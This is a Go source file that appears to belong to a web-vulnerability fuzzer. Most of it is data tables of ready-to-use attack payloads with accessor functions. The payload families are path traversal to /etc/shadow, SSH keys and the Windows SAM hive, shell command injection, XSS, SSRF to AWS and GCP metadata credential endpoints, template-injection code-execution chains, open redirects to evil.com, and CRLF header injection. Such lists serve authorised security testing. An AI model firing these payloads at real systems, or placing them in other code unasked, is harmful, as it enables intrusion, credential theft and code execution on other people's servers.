package payloads

import "strings"

// FuzzCategory classifies a web vulnerability fuzzing payload family.
type FuzzCategory string

const (
	// FuzzLFI is a file inclusion / path traversal probe.
	FuzzLFI FuzzCategory = "lfi"
	// FuzzRCE is a command / OS injection probe.
	FuzzRCE FuzzCategory = "rce"
	// FuzzXSS is a cross-site scripting reflection probe.
	FuzzXSS FuzzCategory = "xss"
	// FuzzSSRF is a server-side request forgery target probe.
	FuzzSSRF FuzzCategory = "ssrf"
	// FuzzSSTI is a server-side template injection evaluation probe.
	FuzzSSTI FuzzCategory = "ssti"
	// FuzzRedirect is an open-redirect payload.
	FuzzRedirect FuzzCategory = "redirect"
	// FuzzCRLF is a header / response-splitting injection payload.
	FuzzCRLF FuzzCategory = "crlf"
)

// FuzzPayload is one fuzzing probe with its classification.
type FuzzPayload struct {
	// Category is the payload family (see FuzzCategory constants).
	Category FuzzCategory
	// Payload is the value to inject into the parameter.
	Payload string
	// Platform is the target platform or engine: "linux", "windows",
	// "php", "aws", "gcp", a template engine name, or "generic".
	Platform string
	// Description is a short human-readable annotation.
	Description string
}

// ---- data tables (immutable, populated once) ----

var fuzzLFI = []FuzzPayload{
	{FuzzLFI, "/etc/passwd", "linux", "Linux passwd file"},
	{FuzzLFI, "/etc/hosts", "linux", "Linux hosts file"},
	{FuzzLFI, "/etc/shadow", "linux", "Linux shadow file (perms required)"},
	{FuzzLFI, "/root/.ssh/id_rsa", "linux", "SSH key disclosure"},
	{FuzzLFI, "/proc/self/environ", "linux", "Process environment disclosure"},
	{FuzzLFI, "/proc/self/cmdline", "linux", "Command-line disclosure"},
	{FuzzLFI, "/var/log/auth.log", "linux", "Auth log poisoning target"},
	{FuzzLFI, "/var/log/apache2/access.log", "linux", "Apache access log poisoning target"},
	{FuzzLFI, "../../../../etc/passwd", "linux", "Deep traversal to Linux passwd"},
	{FuzzLFI, "../../../../etc/hosts", "linux", "Deep traversal to hosts"},
	{FuzzLFI, "../../../../proc/self/environ", "linux", "Deep traversal to process environment"},
	{FuzzLFI, "....//....//....//etc/passwd", "linux", "Dot-dot-slash filter bypass"},
	{FuzzLFI, "..%2f..%2f..%2f..%2fetc/passwd", "linux", "URL-encoded traversal to passwd"},
	{FuzzLFI, "..%2F..%2F..%2Fetc%2Fpasswd", "linux", "Fully encoded path traversal"},
	{FuzzLFI, "..%252f..%252f..%252fetc/passwd", "linux", "Double-encoded traversal"},
	{FuzzLFI, "..%c0%af..%c0%af..%c0%afetc/passwd", "linux", "Overlong UTF-8 slash (IIS normalization)"},
	{FuzzLFI, ".%2e/.%2e/.%2e/.%2e/etc/passwd", "linux", "Mixed dot-and-encoding traversal"},
	{FuzzLFI, "/etc/passwd%00", "linux", "Null-byte path termination"},
	{FuzzLFI, "../../../../etc/passwd%00", "linux", "Traversal with null-byte termination"},
	{FuzzLFI, "../.../../.../etc/passwd", "linux", "Triple-dot walkaround"},
	{FuzzLFI, "C:\\Windows\\win.ini", "windows", "Windows win.ini"},
	{FuzzLFI, "C:\\boot.ini", "windows", "Windows boot.ini"},
	{FuzzLFI, "..\\..\\..\\Windows\\win.ini", "windows", "Backslash traversal to win.ini"},
	{FuzzLFI, "..\\..\\..\\boot.ini", "windows", "Backslash traversal to boot.ini"},
	{FuzzLFI, "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts", "windows", "Windows hosts file via backslash traversal"},
	{FuzzLFI, "C:\\Windows\\System32\\drivers\\etc\\hosts", "windows", "Windows hosts file (direct path)"},
	{FuzzLFI, "..\\..\\..\\Windows\\System32\\config\\SAM", "windows", "Windows SAM registry hive"},
	{FuzzLFI, "%SYSTEMROOT%\\win.ini", "windows", "Environment-variable based Windows path"},
	{FuzzLFI, "php://filter/convert.base64-encode/resource=index.php", "php", "PHP filter base64-encode of index"},
	{FuzzLFI, "php://filter/read=convert.base64-encode/resource=/etc/passwd", "php", "PHP filter base64 of passwd"},
	{FuzzLFI, "php://filter/resource=/etc/passwd", "php", "PHP filter pass-through read"},
	{FuzzLFI, "php://filter/convert.base64-encode/resource=../../../../etc/passwd", "php", "PHP filter + traversal"},
	{FuzzLFI, "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd", "php", "PHP filter deflate + base64"},
	{FuzzLFI, "php://filter/convert.iconv.UTF-8.UTF-7/resource=/etc/passwd", "php", "PHP filter iconv encoding"},
	{FuzzLFI, "php://filter/convert.base64-encode/convert.base64-decode/resource=index.php", "php", "PHP filter dual encode pipeline"},
	{FuzzLFI, "php://input", "php", "PHP input stream (reads raw POST body)"},
	{FuzzLFI, "expect://id", "php", "PHP expect wrapper command execution"},
	{FuzzLFI, "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+", "php", "PHP data wrapper executes phpinfo()"},
	{FuzzLFI, "file:///etc/passwd", "generic", "File scheme absolute path"},
	{FuzzLFI, "file:///etc/hosts", "generic", "File scheme hosts read"},
	{FuzzLFI, "file://C:/Windows/win.ini", "generic", "File scheme Windows path"},
}

var fuzzRCE = []FuzzPayload{
	{FuzzRCE, ";id;", "generic", "Semicolon-wrapped id"},
	{FuzzRCE, "; id", "unix", "Semicolon command injection"},
	{FuzzRCE, "| id", "unix", "Pipe id injection"},
	{FuzzRCE, "||id", "unix", "Double-pipe OR injection"},
	{FuzzRCE, "& id", "generic", "Background command injection"},
	{FuzzRCE, "&& id", "unix", "Logical-AND command injection"},
	{FuzzRCE, "%0a id %0a", "generic", "Newline-delimited injection"},
	{FuzzRCE, "%0d%0a id", "generic", "CRLF injection"},
	{FuzzRCE, "\r\n id", "generic", "Raw CRLF injection"},
	{FuzzRCE, "`id`", "unix", "Backtick command substitution"},
	{FuzzRCE, "$(id)", "unix", "Dollar-parenthesis substitution"},
	{FuzzRCE, "$(whoami)", "unix", "Substitution echo of whoami"},
	{FuzzRCE, "; whoami", "unix", "Whoami via semicolon"},
	{FuzzRCE, "| whoami", "unix", "Whoami via pipe"},
	{FuzzRCE, "; ls -la", "unix", "Directory listing"},
	{FuzzRCE, "| cat /etc/passwd", "unix", "Read passwd via pipe"},
	{FuzzRCE, "|| cat /etc/passwd#", "unix", "Command fallback with comment terminator"},
	{FuzzRCE, "1;cat /etc/passwd", "unix", "Numeric prefix + cat"},
	{FuzzRCE, ";sleep 5", "generic", "Sleep 5 via semicolon"},
	{FuzzRCE, "| sleep 5", "generic", "Sleep 5 via pipe"},
	{FuzzRCE, "&& sleep 5", "generic", "Sleep 5 via AND"},
	{FuzzRCE, "; ping -c 5 127.0.0.1", "unix", "ICMP time delay (Unix)"},
	{FuzzRCE, "| ping -n 5 127.0.0.1", "windows", "ICMP time delay (Windows)"},
	{FuzzRCE, "`ping -c 5 127.0.0.1`", "unix", "Backtick delay probe"},
	{FuzzRCE, "$(ping -c 5 127.0.0.1)", "unix", "Substitution delay probe"},
	{FuzzRCE, ";echo INJECTED_$(id)", "unix", "Visible output marker"},
	{FuzzRCE, "%3Bid", "generic", "Percent-encoded semicolon"},
	{FuzzRCE, "%26%26id", "generic", "Percent-encoded && injection"},
	{FuzzRCE, "\" ; id ; \"", "generic", "Double-quoted breakout"},
	{FuzzRCE, "' ; id ; '", "generic", "Single-quoted breakout"},
	{FuzzRCE, "} ; id ; {", "generic", "Brace breakout (shell snippets)"},
	{FuzzRCE, "1|id", "generic", "Numeric pipe injection"},
	{FuzzRCE, "\x0a id\x0a", "generic", "Raw newline injection"},
	{FuzzRCE, "%0aid%0a", "generic", "Encoded newline id"},
}

var fuzzXSS = []FuzzPayload{
	{FuzzXSS, "<script>alert(1)</script>", "generic", "Direct script tag"},
	{FuzzXSS, "\"><script>alert(1)</script>", "generic", "Attribute breakout script"},
	{FuzzXSS, "'><script>alert(1)</script>", "generic", "Quote breakout script"},
	{FuzzXSS, "<svg/onload=alert(1)>", "generic", "SVG onload handler"},
	{FuzzXSS, "<img src=x onerror=alert(1)>", "generic", "Image error handler"},
	{FuzzXSS, "\"><img src=x onerror=alert(1)>", "generic", "Attribute breakout image"},
	{FuzzXSS, "'\"><img src=x onerror=alert(1)//", "generic", "Quote breakout with comment tail"},
	{FuzzXSS, "<body onload=alert(1)>", "generic", "Body onload handler"},
	{FuzzXSS, "<input onfocus=alert(1) autofocus>", "generic", "Input autofocus handler"},
	{FuzzXSS, "<details open ontoggle=alert(1)>", "generic", "Details ontoggle handler"},
	{FuzzXSS, "<video onerror=alert(1)><source src=x>", "generic", "Video source error handler"},
	{FuzzXSS, "<iframe src=\"javascript:alert(1)\">", "generic", "Iframe javascript scheme"},
	{FuzzXSS, "<a href=\"javascript:alert(1)\">click</a>", "generic", "Anchor javascript scheme"},
	{FuzzXSS, "\" autofocus onfocus=alert(1) x=\"", "generic", "Attribute injection autofocus"},
	{FuzzXSS, "' autofocus onfocus=alert(1) x='", "generic", "Quote attribute injection"},
	{FuzzXSS, "</script><script>alert(1)</script>", "generic", "Break-out script close/reopen"},
	{FuzzXSS, "<scr<script>ipt>alert(1)</scr</script>ipt>", "generic", "Nested split-tag bypass"},
	{FuzzXSS, "<script>alert(1)//</script>", "generic", "Script with comment tail"},
	{FuzzXSS, "%3Cscript%3Ealert(1)%3C/script%3E", "generic", "URL-encoded script"},
	{FuzzXSS, "%3csvg%20onload%3dalert(1)%3e", "generic", "URL-encoded SVG handler"},
	{FuzzXSS, "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;", "generic", "HTML hex entity encoded script"},
	{FuzzXSS, "<svg><script>alert(1)</script></svg>", "generic", "Nested SVG script"},
	{FuzzXSS, "<math><mtext><a href=\"javascript:alert(1)\">x</a>", "generic", "MathML anchor"},
	{FuzzXSS, "<table background=javascript:alert(1)>", "generic", "Background attribute javascript"},
	{FuzzXSS, "<div style=\"width:expression(alert(1))\">", "generic", "CSS expression (legacy IE)"},
	{FuzzXSS, "\" autofocus onmouseover=alert(1) \"", "generic", "Attribute injection mouseover"},
	{FuzzXSS, "<svg onload=alert(1)", "generic", "Unclosed SVG handler"},
	{FuzzXSS, "\"><svg/onload=alert(1)>", "generic", "Breakout SVG handler"},
	{FuzzXSS, "<img src=x onerror=\"javascript:alert(1)\">", "generic", "Image handler with javascript scheme"},
	{FuzzXSS, "\"><iframe src=javascript:alert(1)>", "generic", "Breakout iframe javascript"},
	{FuzzXSS, "/*--></title></style></textarea></script><svg onload=alert(1)>", "generic", "Break-out-of-context polyglot"},
}

var fuzzSSRF = []FuzzPayload{
	{FuzzSSRF, "http://169.254.169.254/latest/meta-data/", "aws", "AWS metadata root"},
	{FuzzSSRF, "http://169.254.169.254/latest/user-data/", "aws", "AWS user data"},
	{FuzzSSRF, "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "aws", "AWS IAM role list"},
	{FuzzSSRF, "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin", "aws", "AWS IAM temp credentials"},
	{FuzzSSRF, "http://169.254.169.254/latest/meta-data/hostname", "aws", "AWS instance hostname"},
	{FuzzSSRF, "http://metadata.google.internal/computeMetadata/v1/", "gcp", "GCP metadata root"},
	{FuzzSSRF, "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", "gcp", "GCP service accounts"},
	{FuzzSSRF, "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "gcp", "GCP access token"},
	{FuzzSSRF, "http://instance-data/latest/meta-data/", "aws", "AWS metadata hostname alias"},
	{FuzzSSRF, "http://127.0.0.1/", "generic", "Loopback IPv4"},
	{FuzzSSRF, "http://127.0.0.1:22/", "generic", "Loopback SSH port"},
	{FuzzSSRF, "http://127.0.0.1:80/", "generic", "Loopback HTTP port"},
	{FuzzSSRF, "http://127.0.0.1:3306/", "generic", "Loopback MySQL port"},
	{FuzzSSRF, "http://127.0.0.1:6379/", "generic", "Loopback Redis port"},
	{FuzzSSRF, "http://127.0.0.1:8080/", "generic", "Loopback common app port"},
	{FuzzSSRF, "http://localhost/", "generic", "Localhost alias"},
	{FuzzSSRF, "http://localhost:22/", "generic", "Localhost SSH"},
	{FuzzSSRF, "http://0.0.0.0/", "generic", "Wildcard-address loopback"},
	{FuzzSSRF, "http://0/", "generic", "Shortened wildcard address"},
	{FuzzSSRF, "http://2130706433/", "generic", "Decimal-form loopback"},
	{FuzzSSRF, "http://0x7f000001/", "generic", "Hex-form loopback"},
	{FuzzSSRF, "http://0177.0.0.1/", "generic", "Octal-form loopback"},
	{FuzzSSRF, "http://127.1/", "generic", "Short-form loopback"},
	{FuzzSSRF, "http://[::1]/", "generic", "IPv6 loopback"},
	{FuzzSSRF, "http://[0:0:0:0:0:ffff:7f00:1]/", "generic", "IPv4-mapped IPv6 loopback"},
	{FuzzSSRF, "http://localtest.me/", "generic", "DNS alias resolving to 127.0.0.1"},
	{FuzzSSRF, "gopher://127.0.0.1:6379/_INFO", "generic", "Gopher to internal Redis"},
	{FuzzSSRF, "dict://127.0.0.1:6379/INFO", "generic", "Dict protocol Redis probe"},
	{FuzzSSRF, "file:///etc/passwd", "generic", "File scheme read"},
	{FuzzSSRF, "file://localhost/etc/passwd", "generic", "File scheme with localhost host"},
}

var fuzzSSTI = []FuzzPayload{
	{FuzzSSTI, "{{7*7}}", "jinja2", "Jinja2/Twig/Django arithmetic probe"},
	{FuzzSSTI, "{{7*'7'}}", "jinja2", "Jinja2 string-multiplication probe"},
	{FuzzSSTI, "{{config}}", "jinja2", "Jinja2 config object disclosure"},
	{FuzzSSTI, "{{self.__class__.__mro__}}", "jinja2", "Jinja2 MRO walk"},
	{FuzzSSTI, "{{''.__class__.__mro__[1].__subclasses__()}}", "jinja2", "Jinja2 subclass enumeration"},
	{FuzzSSTI, "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "jinja2", "Jinja2 RCE via request globals"},
	{FuzzSSTI, "{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"id\")}}", "twig", "Twig filter-callback RCE"},
	{FuzzSSTI, "{7*7}", "smarty", "Smarty arithmetic probe"},
	{FuzzSSTI, "{$smarty.version}", "smarty", "Smarty version disclosure"},
	{FuzzSSTI, "{if phpinfo()}{/if}", "smarty", "Smarty PHP function call"},
	{FuzzSSTI, "<%= 7*7 %>", "erb", "ERB arithmetic probe"},
	{FuzzSSTI, "<%= 7 * 7 %>", "erb", "ERB spaced arithmetic probe"},
	{FuzzSSTI, "<%= system(\"id\") %>", "erb", "ERB command execution"},
	{FuzzSSTI, "${7*7}", "mvel", "MVEL/Velocity-style arithmetic"},
	{FuzzSSTI, "${Runtime.getRuntime().exec(\"id\")}", "mvel", "MVEL runtime exec"},
	{FuzzSSTI, "#set($x=7*7)${x}", "velocity", "Velocity set-and-print probe"},
	{FuzzSSTI, "#set($x=${7*7})${x}", "velocity", "Velocity arithmetic set probe"},
	{FuzzSSTI, "${7*7}", "freemarker", "Freemarker arithmetic probe"},
	{FuzzSSTI, "<#assign x=7*7>${x}", "freemarker", "Freemarker assign probe"},
	{FuzzSSTI, "[[7*7]]", "thymeleaf", "Thymeleaf inline arithmetic"},
	{FuzzSSTI, "[(7*7)]", "thymeleaf", "Thymeleaf unescaped inline"},
	{FuzzSSTI, "${7*7}", "generic", "Generic dollar-brace probe"},
	{FuzzSSTI, "${T(java.lang.System).getenv()}", "generic", "SpEL environment access"},
	{FuzzSSTI, "{{7*7}}${7*7}<%= 7*7 %>", "generic", "Combined multi-engine probe"},
	{FuzzSSTI, "#{7*7}", "generic", "Hash-brace arithmetic probe"},
	{FuzzSSTI, "{{7*7}}", "django", "Django template arithmetic"},
}

var fuzzRedirect = []FuzzPayload{
	{FuzzRedirect, "//evil.com", "generic", "Protocol-relative redirect"},
	{FuzzRedirect, "//evil.com/", "generic", "Protocol-relative with slash"},
	{FuzzRedirect, "/\\evil.com", "generic", "Mixed slash backslash redirect"},
	{FuzzRedirect, "\\\\evil.com", "generic", "Backslash redirected host"},
	{FuzzRedirect, "https://evil.com", "generic", "Absolute HTTPS redirect"},
	{FuzzRedirect, "http://evil.com", "generic", "Absolute HTTP redirect"},
	{FuzzRedirect, "http://evil.com/%2e%2e", "generic", "Encoded dot segment"},
	{FuzzRedirect, "%2f%2fevil.com", "generic", "Encoded protocol-relative"},
	{FuzzRedirect, "%2f%5cevil.com", "generic", "Encoded slashes and backslash"},
	{FuzzRedirect, "http:%2f%2fevil.com", "generic", "Partial-encoded scheme"},
	{FuzzRedirect, "https:%2f%2fevil.com", "generic", "Partial-encoded HTTPS"},
	{FuzzRedirect, "%68%74%74%70%3a%2f%2fevil.com", "generic", "Fully encoded scheme URL"},
	{FuzzRedirect, "javascript:alert(1)", "generic", "Javascript scheme"},
	{FuzzRedirect, "data:text/html,<script>alert(1)</script>", "generic", "Data scheme XSS"},
	{FuzzRedirect, "///evil.com", "generic", "Triple slash redirect"},
	{FuzzRedirect, "////evil.com", "generic", "Quadruple slash redirect"},
	{FuzzRedirect, "\\/\\/evil.com", "generic", "Escaped-forward-slash redirect"},
	{FuzzRedirect, "http://localhost:80@evil.com", "generic", "Userinfo confusion"},
	{FuzzRedirect, "http://evil.com\\@legit.com", "generic", "Backslash before at-sign"},
	{FuzzRedirect, "https://evil.com\\t@legit.com", "generic", "Tab-octet confusion"},
	{FuzzRedirect, "//evil.com/..;/", "generic", "Path-traversal redirect"},
}

var fuzzCRLF = []FuzzPayload{
	{FuzzCRLF, "%0d%0aSet-Cookie:injected=true", "generic", "Encoded CRLF Set-Cookie injection"},
	{FuzzCRLF, "%0d%0aX-Injected:1", "generic", "Encoded CRLF custom header"},
	{FuzzCRLF, "%0d%0aLocation:/admin", "generic", "Encoded CRLF location override"},
	{FuzzCRLF, "%0d%0a%0d%0a<html>injected</html>", "generic", "Response-body injection via blank line"},
	{FuzzCRLF, "%0aSet-Cookie:injected=true", "generic", "LF-only header injection"},
	{FuzzCRLF, "%0dSet-Cookie:injected=true", "generic", "CR-only header injection"},
	{FuzzCRLF, "%0d%0aContent-Length:0%0d%0a%0d%0a", "generic", "Content-Length poisoning"},
	{FuzzCRLF, "%0d%0aSet-Cookie:session=Hijacked", "generic", "Session hijack via Set-Cookie"},
	{FuzzCRLF, "%0d%0aX-Forwarded-For:127.0.0.1", "generic", "Forwarded-for injection"},
	{FuzzCRLF, "%0d%0aRefresh:0;url=/admin", "generic", "Refresh header redirect"},
	{FuzzCRLF, "%0d%0aContent-Type:text/html", "generic", "Content-Type override"},
	{FuzzCRLF, "%00%0d%0aSet-Cookie:injected=true", "generic", "Null-byte prefixed CRLF"},
	{FuzzCRLF, "%250d%250aSet-Cookie:injected=true", "generic", "Double-encoded CRLF"},
	{FuzzCRLF, "\\r\\nSet-Cookie:injected=true", "generic", "Literal backslash-r-n (decoder pass)"},
	{FuzzCRLF, "\\r\\nX-Injected:1\\r\\n", "generic", "Literal backslash CRLF pair"},
	{FuzzCRLF, "\\nSet-Cookie:injected=true", "generic", "Literal backslash-n injection"},
	{FuzzCRLF, "\\rSet-Cookie:injected=true", "generic", "Literal backslash-r injection"},
	{FuzzCRLF, "\r\nSet-Cookie:PHPSESSID=injected\r\n", "generic", "Raw CRLF session injection"},
	{FuzzCRLF, "%0d%0aTransfer-Encoding:chunked", "generic", "Transfer-Encoding override"},
	{FuzzCRLF, "%0d%0aHTTP/1.1%20200%20OK%0d%0a%0d%0a", "generic", "Response smuggling via status-injection"},
}

// fuzzRegistry orders payload groups for stable iteration.
var fuzzRegistry = []struct {
	Category FuzzCategory
	Set      []FuzzPayload
}{
	{FuzzLFI, fuzzLFI},
	{FuzzRCE, fuzzRCE},
	{FuzzXSS, fuzzXSS},
	{FuzzSSRF, fuzzSSRF},
	{FuzzSSTI, fuzzSSTI},
	{FuzzRedirect, fuzzRedirect},
	{FuzzCRLF, fuzzCRLF},
}

// FuzzCategories returns the supported category names in canonical order.
func FuzzCategories() []FuzzCategory {
	return []FuzzCategory{
		FuzzLFI, FuzzRCE, FuzzXSS, FuzzSSRF, FuzzSSTI, FuzzRedirect, FuzzCRLF,
	}
}

// GetFuzzPayloads returns defensive copies of the payloads in one category.
// An empty category returns every category.
func GetFuzzPayloads(cat FuzzCategory) []FuzzPayload {
	out := make([]FuzzPayload, 0, 64)
	for _, group := range fuzzRegistry {
		if cat != "" && group.Category != cat {
			continue
		}
		out = append(out, group.Set...)
	}
	return out
}

// GetAllFuzzPayloads returns defensive copies of the entire fuzzing library.
func GetAllFuzzPayloads() []FuzzPayload {
	var total int
	for _, group := range fuzzRegistry {
		total += len(group.Set)
	}
	out := make([]FuzzPayload, 0, total)
	for _, group := range fuzzRegistry {
		out = append(out, group.Set...)
	}
	return out
}

// filterFuzz matches payloads by category and, when platform is non-empty, by
// platform, returning the raw payload strings.
func filterFuzz(cat FuzzCategory, platform string) []string {
	filtered := make([]string, 0, 64)
	for _, group := range fuzzRegistry {
		if group.Category != cat {
			continue
		}
		for _, p := range group.Set {
			if platform != "" && p.Platform != platform {
				continue
			}
			filtered = append(filtered, p.Payload)
		}
	}
	return filtered
}

// GetLFIPayloads returns file-inclusion / traversal payload strings. A
// non-empty platform ("linux", "windows", "php", "generic") narrows the set.
func GetLFIPayloads(platform string) []string {
	return filterFuzz(FuzzLFI, strings.ToLower(strings.TrimSpace(platform)))
}

// GetRCEPayloads returns the command-injection probe strings.
func GetRCEPayloads() []string {
	return filterFuzz(FuzzRCE, "")
}

// GetXSSProbes returns the cross-site scripting reflection probes.
func GetXSSProbes() []string {
	return filterFuzz(FuzzXSS, "")
}

// GetSSRFPayloads returns the server-side request forgery target strings.
func GetSSRFPayloads() []string {
	return filterFuzz(FuzzSSRF, "")
}

// GetSSTIPayloads returns the template-injection evaluation probes for all
// engines. Use GetSSTIPayloadsByEngine for a single engine's set.
func GetSSTIPayloads() []string {
	return filterFuzz(FuzzSSTI, "")
}

// GetSSTIPayloadsByEngine returns the template-injection probes for one
// template engine ("jinja2", "twig", "smarty", "erb", "mvel", "velocity",
// "freemarker", "thymeleaf", "django", or "generic"). Engine names are
// matched case-insensitively; an empty engine returns all engines.
func GetSSTIPayloadsByEngine(engine string) []string {
	return filterFuzz(FuzzSSTI, strings.ToLower(strings.TrimSpace(engine)))
}

// GetRedirectPayloads returns the open-redirect payload strings.
func GetRedirectPayloads() []string {
	return filterFuzz(FuzzRedirect, "")
}

// GetCRLFPayloads returns the header-injection payload strings.
func GetCRLFPayloads() []string {
	return filterFuzz(FuzzCRLF, "")
}
